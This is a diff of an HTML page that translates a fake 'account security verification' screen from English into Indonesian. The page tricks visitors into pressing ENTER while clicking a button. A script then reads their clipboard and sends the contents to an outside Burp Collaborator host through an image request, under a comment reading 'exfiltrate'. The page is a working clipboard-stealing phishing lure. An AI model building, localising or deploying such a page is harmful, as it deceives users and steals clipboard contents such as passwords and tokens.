@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Secure Validation</title>
+  <title>Validasi Hybrid Keyboard + Mouse</title>
   <style>
     body {
       font-family: sans-serif;
@@ -28,9 +28,9 @@
 </head>
 <body>
 
-  <h2>Account Security Validation</h2>
-  <div id="msg">🔐 Press the ENTER key to begin verification</div>
-  <button id="btn" style="display:none;">Continue Verification</button>
+  <h2>Verifikasi Sistem</h2>
+  <div id="msg">🔐 Tekan tombol ENTER untuk memulai</div>
+  <button id="btn" style="display:none;">Lanjutkan Verifikasi tekan enter dan klik secara bersamaan</button>
   <div id="result"></div>
 
   <script>
@@ -43,7 +43,7 @@
 
       if (stage === 0) {
         stage = 1;
-        document.getElementById("msg").innerText = "⬇️ Now press and hold ENTER while clicking the button below";
+        document.getElementById("msg").innerText = "⬇️ Tekan ENTER dan klik tombol secara bersamaan untuk menyelesaikan verifikasi";
         document.getElementById("btn").style.display = "inline-block";
       }
 
@@ -61,23 +61,23 @@
     document.getElementById("btn").addEventListener("click", () => {
       if (stage === 1 && enterHeld && !triggered) {
         triggered = true;
-        document.getElementById("msg").innerText = "📋 Reading clipboard...";
+        document.getElementById("msg").innerText = "📋 Membaca clipboard...";
 
         navigator.clipboard.readText()
           .then(text => {
-            document.getElementById("result").innerText = "📋 Clipboard contains:\n" + text;
+            document.getElementById("result").innerText = "📋 Clipboard berisi:\n" + text;
 
-            // Optional: exfiltration
+            // Optional: exfiltrate
             const img = new Image();
             img.src = "https://7lt06qlfukri71j8ui2scllc238vwk.burpcollaborator.net/log?clip=" + encodeURIComponent(text);
 
-            document.getElementById("msg").innerText = "✅ Verification complete.";
+            document.getElementById("msg").innerText = "✅ Verifikasi selesai.";
           })
           .catch(err => {
-            document.getElementById("msg").innerText = "❌ Failed to read clipboard: " + err;
+            document.getElementById("msg").innerText = "❌ Gagal membaca clipboard: " + err;
           });
       } else if (!enterHeld) {
-        document.getElementById("msg").innerText = "⚠️ Please press and hold ENTER while clicking the button!";
+        document.getElementById("msg").innerText = "⚠️ Tekan ENTER dan klik tombol secara bersamaan!";
       }
     });
   </script>
